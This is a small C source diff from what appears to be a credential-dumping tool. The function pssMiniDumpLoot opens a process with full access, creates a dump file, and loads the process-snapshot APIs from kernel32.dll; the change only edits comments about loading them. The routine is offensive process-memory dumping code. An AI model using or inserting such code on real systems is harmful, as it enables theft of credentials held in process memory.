@@ -92,10 +92,11 @@ BOOL pssMiniDumpLoot() {
 	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
 	HANDLE hFile = CreateFile(dmpPath, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
-	// load PssCaptureSnapshot dynamically incase program is running on incompatible system, an alternative method could be delayed loading
+	// load PssCaptureSnapshot dynamically incase program is running on incompatible system
+	// delay loading will not work since function is from kernel32.dll: https://devblogs.microsoft.com/oldnewthing/20100201-00/?p=15123
 	PPssCaptureSnapshot pPCS;
 	pPCS = (PPssCaptureSnapshot)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "PssCaptureSnapshot");
-	// load PssFreeSnapshot dynamically incase program is running on incompatible system, an alternative method could be delayed loading
+	// load PssFreeSnapshot dynamically incase program is running on incompatible system
 	PPssFreeSnapshot pPFS;
 	pPFS = (PPssFreeSnapshot)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "PssFreeSnapshot");
 
